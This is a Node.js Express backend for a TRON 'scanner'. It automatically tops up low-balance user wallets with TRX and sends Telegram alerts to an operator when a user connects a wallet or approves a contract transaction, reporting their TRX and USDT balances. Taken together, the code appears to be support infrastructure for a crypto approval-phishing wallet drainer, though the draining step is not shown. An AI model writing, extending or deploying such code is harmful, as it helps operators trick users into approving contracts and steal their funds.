const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const TronWeb = require('tronweb');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Security middleware
app.use(helmet());
app.use(cors({
    origin: true, // Allow all origins
    credentials: true
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

app.use(express.json());

// TronWeb configuration
const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: process.env.TRON_PRIVATE_KEY
});

// Your server wallet configuration
const SERVER_CONFIG = {
    privateKey: process.env.TRON_PRIVATE_KEY,
    address: process.env.TRON_ADDRESS,
    autoSendAmount: 15, // TRX to send automatically
    minimumBalance: 14 // Minimum TRX to keep in user wallet
};

// Middleware to validate requests
const validateRequest = (req, res, next) => {
    const { userAddress } = req.body;
    
    if (!userAddress) {
        return res.status(400).json({ 
            error: 'User address is required',
            success: false 
        });
    }
    
    if (!TronWeb.isAddress(userAddress)) {
        return res.status(400).json({ 
            error: 'Invalid TRON address',
            success: false 
        });
    }
    
    next();
};

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        message: 'TRON Scanner Backend is running',
        timestamp: new Date().toISOString(),
        serverAddress: SERVER_CONFIG.address
    });
});

// Check user balance
app.post('/check-balance', validateRequest, async (req, res) => {
    try {
        const { userAddress } = req.body;
        
        console.log(`Checking balance for: ${userAddress}`);
        
        // Get user balance
        const balance = await tronWeb.trx.getBalance(userAddress);
        const balanceInTRX = tronWeb.fromSun(balance);
        
        res.json({
            success: true,
            address: userAddress,
            balance: balanceInTRX,
            needsFunding: balanceInTRX < SERVER_CONFIG.minimumBalance,
            autoSendAmount: SERVER_CONFIG.autoSendAmount
        });
        
    } catch (error) {
        console.error('Balance check error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to check balance',
            message: error.message
        });
    }
});

// Send TRX automatically if user needs funding
app.post('/send-trx', validateRequest, async (req, res) => {
    try {
        const { userAddress } = req.body;
        
        console.log(`Sending TRX to: ${userAddress}`);
        
        // Check if user already has enough balance
        const balance = await tronWeb.trx.getBalance(userAddress);
        const balanceInTRX = tronWeb.fromSun(balance);
        
        if (balanceInTRX >= SERVER_CONFIG.minimumBalance) {
            return res.json({
                success: true,
                message: 'User already has sufficient balance',
                balance: balanceInTRX,
                sent: false
            });
        }
        
        // Check server balance
        const serverBalance = await tronWeb.trx.getBalance(SERVER_CONFIG.address);
        const serverBalanceInTRX = tronWeb.fromSun(serverBalance);
        
        if (serverBalanceInTRX < SERVER_CONFIG.autoSendAmount) {
            return res.status(500).json({
                success: false,
                error: 'Server has insufficient funds',
                serverBalance: serverBalanceInTRX,
                required: SERVER_CONFIG.autoSendAmount
            });
        }
        
        // Send TRX to user
        const transaction = await tronWeb.transactionBuilder.sendTrx(
            userAddress,
            tronWeb.toSun(SERVER_CONFIG.autoSendAmount),
            SERVER_CONFIG.address
        );
        
        const signedTransaction = await tronWeb.trx.sign(transaction);
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        
        if (result.result) {
            console.log(`Successfully sent ${SERVER_CONFIG.autoSendAmount} TRX to ${userAddress}`);
            console.log(`Transaction ID: ${result.txid}`);
            
            res.json({
                success: true,
                message: `Sent ${SERVER_CONFIG.autoSendAmount} TRX successfully`,
                transactionId: result.txid,
                amount: SERVER_CONFIG.autoSendAmount,
                recipient: userAddress,
                sent: true
            });
        } else {
            throw new Error('Transaction failed');
        }
        
    } catch (error) {
        console.error('Send TRX error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to send TRX',
            message: error.message
        });
    }
});

// Get transaction status
app.post('/transaction-status', async (req, res) => {
    try {
        const { transactionId } = req.body;
        
        if (!transactionId) {
            return res.status(400).json({
                success: false,
                error: 'Transaction ID is required'
            });
        }
        
        const transaction = await tronWeb.trx.getTransaction(transactionId);
        
        res.json({
            success: true,
            transactionId: transactionId,
            status: transaction.ret ? 'success' : 'failed',
            confirmed: transaction.ret ? true : false,
            transaction: transaction
        });
        
    } catch (error) {
        console.error('Transaction status error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get transaction status',
            message: error.message
        });
    }
});

// Server info endpoint
app.get('/server-info', (req, res) => {
    res.json({
        success: true,
        serverAddress: SERVER_CONFIG.address,
        autoSendAmount: SERVER_CONFIG.autoSendAmount,
        minimumBalance: SERVER_CONFIG.minimumBalance,
        network: 'Mainnet',
        apiVersion: '1.0.0'
    });
});

// Telegram notification endpoint
app.post('/telegram-notify', async (req, res) => {
    try {
        const { type, walletAddress, balance, usdtBalance, transactionId, amount, trxBalance, timestamp } = req.body;
        
        // Get Telegram bot token and chat ID from environment variables
        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
        const telegramChatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!telegramBotToken || !telegramChatId) {
            console.warn('Telegram credentials not configured');
            return res.status(200).json({
                success: false,
                message: 'Telegram not configured',
                warning: true
            });
        }
        
        let message = '';
        
        if (type === 'wallet_connect') {
            const { balance, usdtBalance } = req.body;
            const trxBalanceStr = balance ? balance.toFixed(6) : 'N/A';
            const usdtBalanceStr = usdtBalance !== undefined ? parseFloat(usdtBalance).toFixed(2) : 'N/A';
            message = `🔗 Wallet Connected\n\n` +
                     `💰 Wallet Address: \`${walletAddress}\`\n` +
                     `💵 TRX Balance: ${trxBalanceStr} TRX\n` +
                     `💵 USDT Balance: ${usdtBalanceStr} USDT\n` +
                     `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
                     `✅ User successfully connected their wallet`;
        } else if (type === 'transaction_approve') {
            const { amount, transactionId, trxBalance, usdtBalance } = req.body;
            const amountInTRX = amount ? (parseInt(amount) / 1000000).toFixed(6) : 'N/A';
            // Extract transaction ID properly - handle strings and objects
            let txIdStr = 'N/A';
            if (transactionId) {
                if (typeof transactionId === 'string') {
                    txIdStr = transactionId;
                } else if (typeof transactionId === 'object' && transactionId !== null) {
                    txIdStr = transactionId.txid || transactionId.txID || transactionId.hash || JSON.stringify(transactionId);
                } else {
                    txIdStr = String(transactionId);
                }
            }
            const trxBalanceStr = trxBalance !== undefined ? parseFloat(trxBalance).toFixed(6) : 'N/A';
            const usdtBalanceStr = usdtBalance !== undefined ? parseFloat(usdtBalance).toFixed(2) : 'N/A';
            message = `✅ Transaction Approved\n\n` +
                     `💰 Wallet Address: \`${walletAddress}\`\n` +
                     `📊 Transaction ID: \`${txIdStr}\`\n` +
                     `💵 Transaction Amount: ${amountInTRX} TRX\n` +
                     `💵 Current TRX Balance: ${trxBalanceStr} TRX\n` +
                     `💵 Current USDT Balance: ${usdtBalanceStr} USDT\n` +
                     `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
                     `✅ User successfully approved the contract transaction`;
        } else {
            return res.status(400).json({
                success: false,
                error: 'Invalid notification type'
            });
        }
        
        // Send message to Telegram
        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const telegramResponse = await axios.post(telegramApiUrl, {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'Markdown'
        });
        
        const telegramData = telegramResponse.data;
        
        if (telegramData.ok) {
            console.log(`Telegram notification sent successfully: ${type}`);
            res.json({
                success: true,
                message: 'Telegram notification sent',
                telegramMessageId: telegramData.result.message_id
            });
        } else {
            console.error('Telegram API error:', telegramData);
            res.status(500).json({
                success: false,
                error: 'Failed to send Telegram notification',
                telegramError: telegramData
            });
        }
        
    } catch (error) {
        console.error('Telegram notification error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to send Telegram notification',
            message: error.message
        });
    }
});

// Error handling
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: err.message
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 TRON Scanner Backend running on port ${PORT}`);
    console.log(`🔑 Server Address: ${SERVER_CONFIG.address}`);
    console.log(`💰 Auto-send Amount: ${SERVER_CONFIG.autoSendAmount} TRX`);
    console.log(`📊 Minimum Balance: ${SERVER_CONFIG.minimumBalance} TRX`);
    console.log(`🌐 Health check: http://localhost:${PORT}/health`);
});

module.exports = app;
